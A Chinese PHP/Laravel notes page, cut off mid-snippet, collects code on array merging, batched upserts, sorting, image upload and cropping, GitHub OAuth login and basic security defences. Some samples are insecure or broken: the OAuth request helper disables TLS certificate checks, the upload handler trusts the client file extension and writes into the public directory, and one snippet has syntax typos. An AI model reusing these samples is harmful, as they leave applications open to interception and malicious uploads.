<h3 id="数组整合合并"><a href="#数组整合合并" class="headerlink" title="数组整合合并"></a>数组整合合并</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$a=[</span><br><span class="line">   [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">"name"</span>=&gt; <span class="string">"std_name_0"</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt;<span class="number">2</span>,</span><br><span class="line">        <span class="string">"name"</span>=&gt; <span class="string">"std_name_1"</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">3</span>,</span><br><span class="line">        <span class="string">"name"</span>=&gt;<span class="string">"std_name_2"</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">4</span>,</span><br><span class="line">        <span class="string">"name"</span>=&gt; <span class="string">"std_name_3"</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">5</span>,</span><br><span class="line">        <span class="string">"name"</span>=&gt; <span class="string">"std_name_4"</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line">$b=[</span><br><span class="line">[</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">2</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt;<span class="number">0</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">3</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt; <span class="number">2</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt;<span class="number">4</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt; <span class="number">4</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">5</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt;<span class="number">6</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">6</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt; <span class="number">8</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt; <span class="number">7</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt; <span class="number">10</span></span><br><span class="line">    ],</span><br><span class="line">    [</span><br><span class="line">        <span class="string">"id"</span>=&gt;<span class="number">8</span>,</span><br><span class="line">        <span class="string">"order_count"</span>=&gt; <span class="number">12</span></span><br><span class="line">    ]</span><br><span class="line">]</span><br><span class="line">$users_info=[];</span><br><span class="line">foreach ($a <span class="keyword">as</span> $val)&#123;</span><br><span class="line">    $users_info[$val[<span class="string">'id'</span>]][<span class="string">'id'</span>] = $val[<span class="string">'id'</span>];</span><br><span class="line">    $users_info[$val[<span class="string">'id'</span>]][<span class="string">'name'</span>] = $val[<span class="string">'name'</span>];</span><br><span class="line">    $users_info[$val[<span class="string">'id'</span>]][<span class="string">'order_count'</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">foreach ($b <span class="keyword">as</span> $val)&#123;</span><br><span class="line">    $users_info[$val[<span class="string">'id'</span>]][<span class="string">'id'</span>] = $val[<span class="string">'id'</span>];</span><br><span class="line">    $users_info[$val[<span class="string">'id'</span>]][<span class="string">'order_count'</span>] = $val[<span class="string">'order_count'</span>];</span><br><span class="line">    $users_info[$val[<span class="string">'id'</span>]][<span class="string">'name'</span>] = $users_info[$val[<span class="string">'id'</span>]][<span class="string">'name'</span>]??<span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line">&gt;&gt;&gt; $users_info</span><br><span class="line">=&gt; [</span><br><span class="line">     <span class="number">1</span> =&gt; [</span><br><span class="line">       <span class="string">"id"</span> =&gt; <span class="number">1</span>,</span><br><span class="line">       <span class="string">"name"</span> =&gt; <span class="string">"std_name_0"</span>,</span><br><span class="line">       <span class="string">"order_count"</span> =&gt; <span class="number">0</span>,</span><br><span class="line">     ],</span><br><span class="line">     <span class="number">2</span> =&gt; [</span><br><span class="line">       <span class="string">"id"</span> =&gt; <span class="number">2</span>,</span><br><span class="line">       <span class="string">"name"</span> =&gt; <span class="string">"std_name_1"</span>,</span><br><span class="line">       <span class="string">"order_count"</span> =&gt; <span class="number">0</span>,</span><br><span class="line">     ],</span><br><span class="line">     <span class="number">3</span> =&gt; [</span><br><span class="line">       <span class="string">"id"</span> =&gt; <span class="number">3</span>,</span><br><span class="line">       <span class="string">"name"</span> =&gt; <span class="string">"std_name_2"</span>,</span><br><span class="line">       <span class="string">"order_count"</span> =&gt; <span class="number">2</span>,</span><br><span class="line">     ],</span><br><span class="line">     <span class="number">4</span> =&gt; [</span><br><span class="line">       <span class="string">"id"</span> =&gt; <span class="number">4</span>,</span><br><span class="line">       <span class="string">"name"</span> =&gt; <span class="string">"std_name_3"</span>,</span><br><span class="line">       <span class="string">"order_count"</span> =&gt; <span class="number">4</span>,</span><br><span class="line">     ],</span><br><span class="line">https:<span class="comment">//www.guaosi.com/2018/12/14/complex-two-dimensional-arrays/</span></span><br></pre></td></tr></table></figure>
<h3 id="循环中查询数据库"><a href="#循环中查询数据库" class="headerlink" title="循环中查询数据库"></a>循环中查询数据库</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">foreach ( $product <span class="keyword">as</span> $p) &#123;</span><br><span class="line">       <span class="comment">//如果存在则更新</span></span><br><span class="line">       <span class="keyword">if</span> ( $<span class="keyword">this</span>-&gt;count($p) ) &#123;</span><br><span class="line">           $<span class="keyword">this</span>-&gt;update($p);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           $<span class="keyword">this</span>-&gt;insert($p);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">     $product = [</span><br><span class="line">           [</span><br><span class="line">               <span class="string">'product_id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">               <span class="string">'pnid'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">               <span class="string">'pvid'</span>=&gt;<span class="number">10</span></span><br><span class="line">           ],</span><br><span class="line">           [</span><br><span class="line">               <span class="string">'product_id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">               <span class="string">'pnid'</span>=&gt;<span class="number">3</span>,</span><br><span class="line">               <span class="string">'pvid'</span>=&gt;<span class="number">30</span></span><br><span class="line">           ],</span><br><span class="line">           [</span><br><span class="line">               <span class="string">'product_id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">               <span class="string">'pnid'</span>=&gt;<span class="number">12</span>,</span><br><span class="line">               <span class="string">'pvid'</span>=&gt;<span class="number">21</span></span><br><span class="line">           ],</span><br><span class="line">           [</span><br><span class="line">               <span class="string">'product_id'</span>=&gt;<span class="number">1</span>,</span><br><span class="line">               <span class="string">'pnid'</span>=&gt;<span class="number">31</span>,</span><br><span class="line">               <span class="string">'pvid'</span>=&gt;<span class="number">33</span></span><br><span class="line">           ],</span><br><span class="line">       ];</span><br><span class="line">   </span><br><span class="line">       <span class="comment">//获取product_id为1的数据</span></span><br><span class="line">       $oldData = $<span class="keyword">this</span>-&gt;get(<span class="number">1</span>);</span><br><span class="line">   </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">       * 这里会把数据组成以pnid为键的数组</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">       $oldKeyData = array_column($oldData,NULL,<span class="string">'pnid'</span>);</span><br><span class="line">   </span><br><span class="line">       $update = [];</span><br><span class="line">       $insert = [];</span><br><span class="line">   </span><br><span class="line">       foreach ( $product <span class="keyword">as</span> $p) &#123;</span><br><span class="line">           <span class="keyword">if</span> ( isset($oldKeyData[$p[<span class="string">'pnid'</span>]]) ) &#123;</span><br><span class="line">               $updatep[] = $p;</span><br><span class="line">           &#125; eles &#123;</span><br><span class="line">               $insert[] = $p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   </span><br><span class="line">       <span class="comment">//进行更新和删除https://learnku.com/articles/29764</span></span><br></pre></td></tr></table></figure>
<h3 id="json排序"><a href="#json排序" class="headerlink" title="json排序"></a>json排序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">array:<span class="number">5</span> [</span><br><span class="line">  <span class="number">6</span> =&gt; <span class="string">"中国"</span></span><br><span class="line">  <span class="number">5</span> =&gt; <span class="string">"美国"</span></span><br><span class="line">  <span class="number">4</span> =&gt; <span class="string">"日本"</span></span><br><span class="line">  <span class="number">1</span> =&gt; <span class="string">"俄罗斯"</span></span><br><span class="line">  <span class="number">2</span> =&gt; <span class="string">"英国"</span></span><br><span class="line">]</span><br><span class="line"> <span class="keyword">return</span> Response::send(<span class="number">0</span>,<span class="string">'成功！'</span>,$data);</span><br><span class="line">data    &#123;…&#125;</span><br><span class="line"><span class="number">1</span>   俄罗斯</span><br><span class="line"><span class="number">2</span>   英国</span><br><span class="line"><span class="number">4</span>   日本</span><br><span class="line"><span class="number">5</span>   美国</span><br><span class="line"><span class="number">6</span>   中国</span><br><span class="line">每个数字 key 前面加个空格字符串即可。</span><br></pre></td></tr></table></figure>
<h3 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_multisort(array_column($array,<span class="string">'sort'</span>),SORT_ASC,$array);</span><br></pre></td></tr></table></figure>
<h3 id="图片上传添加自动裁剪"><a href="#图片上传添加自动裁剪" class="headerlink" title="图片上传添加自动裁剪"></a>图片上传添加自动裁剪</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> intervention/image</span><br><span class="line"></span><br><span class="line">Intervention\Image\ImageServiceProvider::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line"><span class="class">'<span class="title">Image</span>' </span>=&gt; Intervention\Image\Facades\Image::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">php artisan vendor:publish --provider="Intervention\Image\ImageServiceProviderLaravel5"</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">image_upload</span>(<span class="params">Request $req</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ($req-&gt;isMethod(<span class="string">'POST'</span>)) &#123;</span><br><span class="line">$file = $req-&gt;file(<span class="string">'file'</span>);</span><br><span class="line"><span class="comment">// 图片宽度参数 可以写死也可传值接收 关闭 false</span></span><br><span class="line">$max_width = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> ($file-&gt;isValid()) &#123;</span><br><span class="line">$realPath = $file-&gt;getRealPath ();<span class="comment">// 临时文件路径</span></span><br><span class="line"></span><br><span class="line">    $entension = $file-&gt;getClientOriginalExtension();<span class="comment">//上传文件后缀名</span></span><br><span class="line">    $time = date(<span class="string">'Ym'</span>);</span><br><span class="line">    $newName = md5(uniqid(microtime(<span class="literal">true</span>), <span class="literal">true</span>)) . date(<span class="string">'YmdHis'</span>) . <span class="string">'.'</span> . $entension;</span><br><span class="line">    $path = $file-&gt;move(base_path() . <span class="string">'/public/upload/image/'</span> . $time, $newName);</span><br><span class="line">    $filepath = <span class="string">'/upload/image/'</span> . $time . <span class="string">'/'</span> . $newName;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 图片物理路径  特别重要 如果路径则无法识别写入图片</span></span><br><span class="line">    $img = public_path().<span class="string">'/'</span>.$filepath;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  图片剪裁逻辑  如果限制了图片宽度且不为gif格式，就进行裁剪</span></span><br><span class="line">    <span class="keyword">if</span> ($max_width &amp;&amp; $entension != <span class="string">'gif'</span>) &#123;</span><br><span class="line">        <span class="comment">// 此类中封装的函数，用于裁剪图片</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;reduceSize($img, $max_width);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response()-&gt;json([<span class="string">'status'</span> =&gt; <span class="number">0</span>, <span class="string">'msg'</span> =&gt; <span class="string">'上传成功'</span>, <span class="string">'filepath'</span> =&gt; $filepath]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception $e) &#123;</span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;doFailure($e);</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 图片按宽度剪裁</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">reduceSize</span>(<span class="params">$img, $max_width</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 先实例化，传参是文件的磁盘物理路径</span></span><br><span class="line"></span><br><span class="line">$image = Image::make($img);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行大小调整的操作</span></span><br><span class="line">$image-&gt;resize($max_width, <span class="literal">null</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$constraint</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设定宽度是 $max_width，高度等比例双方缩放</span></span><br><span class="line">$constraint-&gt;aspectRatio();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 防止裁图时图片尺寸变大</span></span><br><span class="line">$constraint-&gt;upsize();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对图片修改后进行保存</span></span><br><span class="line">$image-&gt;save();</span><br><span class="line">&#125;<span class="string">`</span></span><br></pre></td></tr></table></figure>
<h3 id="快速接入-GitHub-登陆"><a href="#快速接入-GitHub-登陆" class="headerlink" title="快速接入 GitHub 登陆"></a>快速接入 GitHub 登陆</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 发送请求(也可以直接使用guzzle)</span></span><br><span class="line"><span class="comment"> *https://learnku.com/articles/29160</span></span><br><span class="line"><span class="comment"> * @param string $url      请求地址</span></span><br><span class="line"><span class="comment"> * @param array $data      请求数据</span></span><br><span class="line"><span class="comment"> * @param array $headers   请求头</span></span><br><span class="line"><span class="comment"> * @return string|array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendRequest</span>(<span class="params">$url, $data = [], $headers = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="literal">false</span>);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);</span><br><span class="line">    <span class="keyword">if</span> (!empty($data)) &#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_TIMEOUT, <span class="number">60</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line">        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);</span><br><span class="line">    &#125;</span><br><span class="line">    $response = curl_exec($ch) ? curl_multi_getcontent($ch) : <span class="string">''</span>;</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果用户同意登陆， github 就会返回到 callback.php 并携带一个code参数</span></span><br><span class="line"><span class="comment">// 此时只需要使用这个 code 去获取 access_token, 然后在使用 access_token 获取用户信息</span></span><br><span class="line">$url        = <span class="string">"https://github.com/login/oauth/access_token"</span>;</span><br><span class="line">$app_id     = <span class="string">"your github oauth app client_id"</span>;</span><br><span class="line">$app_secret = <span class="string">"your github oauth app client_secret"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组合请求参数</span></span><br><span class="line">$code   = $_GET[<span class="string">'code'</span>];</span><br><span class="line">$params = [</span><br><span class="line">    <span class="string">'client_id'</span>     =&gt; $app_id,</span><br><span class="line">    <span class="string">'client_secret'</span> =&gt; $app_secret,</span><br><span class="line">    <span class="string">'code'</span>          =&gt; $code,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送请求并获取响应信息</span></span><br><span class="line">$response = sendRequest($url, $params, [<span class="string">'Accept: application/json'</span>]);</span><br><span class="line">$response = json_decode($response, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果有响应信息， 说明请求成功</span></span><br><span class="line"><span class="keyword">if</span> (!empty($response[<span class="string">'access_token'</span>])) &#123;</span><br><span class="line">    <span class="comment">// 请求成功，使用 access_token 获取用户信息</span></span><br><span class="line">    $access_token = $response[<span class="string">'access_token'</span>];</span><br><span class="line">    $url = <span class="string">"https://api.github.com/user"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送请求，调取github API 获取用户信息</span></span><br><span class="line">    $userInfo =  sendRequest($url,[],[</span><br><span class="line">        <span class="string">"Accept: application/json"</span>,</span><br><span class="line">        <span class="string">"User-Agent: ilearn"</span>,  <span class="comment">// 此处(ilearn)是填写应用名称 或者 github用户名</span></span><br><span class="line">        <span class="string">"Authorization:token &#123;$access_token&#125;"</span></span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    exit($userInfo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果登陆失败就打印错误信息</span></span><br><span class="line">echo <span class="string">"&lt;p&gt;登陆失败&lt;/p&gt;&lt;/pre&gt;"</span>;</span><br><span class="line">var_dump($response);</span><br><span class="line">exit(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//github.com/overtrue/laravel-socialite</span></span><br><span class="line"></span><br><span class="line">使用命令 composer <span class="built_in">require</span> huoshaotuzi/sociate 安装，现在支持 QQ、微博、微信公众号、百度、Github 登录，以后有时间还会继续扩展更多的登录。https:<span class="comment">//learnku.com/laravel/t/24449</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-安全问题入门"><a href="#PHP-安全问题入门" class="headerlink" title="PHP 安全问题入门"></a>PHP 安全问题入门</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">SQL 注入</span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$query = $pdo-&gt;prepare(<span class="string">'SELECT * FROM users WHERE username = :username'</span>);</span><br><span class="line">$query-&gt;execute([<span class="string">'username'</span> =&gt; $username]);</span><br><span class="line">$data = $query-&gt;fetch();</span><br><span class="line"></span><br><span class="line">xss </span><br><span class="line">$searchQuery = htmlentities($searchQuery, ENT_QUOTES);</span><br><span class="line">XSRF/CSRF</span><br><span class="line">最常用的防御方法是生成一个 CSRF 令牌加密安全字符串，一般称其为 Token，并将 Token 存储于 Cookie 或者 Session 中。</span><br><span class="line"></span><br><span class="line">每次你在网页构造表单时，将 Token 令牌放在表单中的隐藏字段，表单请求服务器以后会根据用户的 Cookie 或者 Session 里的 Token 令牌比对，校验成功才给予通过</span><br><span class="line"></span><br><span class="line">密码哈希</span><br><span class="line"></span><br><span class="line"><span class="comment">//user signup</span></span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$hashedPassword = password_hash($password, PASSWORD_DEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="comment">//login</span></span><br><span class="line">$password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">$hash = <span class="string">'1234'</span>; <span class="comment">//load this value from your db</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(password_verify($password, $hash)) &#123;</span><br><span class="line">  echo <span class="string">'Password is valid!'</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  echo <span class="string">'Invalid password.'</span>;</span><br><span class="line">&#125;</span><br><span class="line">密码哈希并不是密码加密。哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要），而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。显然他们之间最大的区别是可逆性，在储存密码时，我们要的就是哈希这种不可逆的属性。</span><br><span class="line"></span><br><span class="line">命令注入</span><br><span class="line">$targetIp = escapeshellarg($_GET[<span class="string">'ip'</span>]);</span><br><span class="line">$output = shell_exec(<span class="string">"ping -c 5 $targetIp"</span>);</span><br><span class="line"></span><br><span class="line">像登录这样的敏感表单应该有一个严格的速率限制，以防止暴力攻击。保存每个用户在过去几分钟内失败的登录尝试次数，如果该速率超过你定义的阈值，则拒绝进一步登录尝试，直到冷却期结束。还可通过电子邮件通知用户登录失败，以便他们知道自己的账户被成为目标。</span><br><span class="line">https:<span class="comment">//learnku.com/php/t/24930#reply94655</span></span><br></pre></td></tr></table></figure>
<h3 id="内置-Web-服务器"><a href="#内置-Web-服务器" class="headerlink" title="内置 Web 服务器"></a>内置 Web 服务器</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">php -S localhost:<span class="number">8000</span> -t public/</span><br><span class="line">php -S localhost:<span class="number">8000</span> router.php</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对URL进行解析，并获取请求的文件名</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$uri = urldecode(parse_url($_SERVER[<span class="string">"REQUEST_URI"</span>], PHP_URL_PATH));</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否存在该文件，如果不存在，则直接继续加载入口文件</span></span><br><span class="line"><span class="comment"> 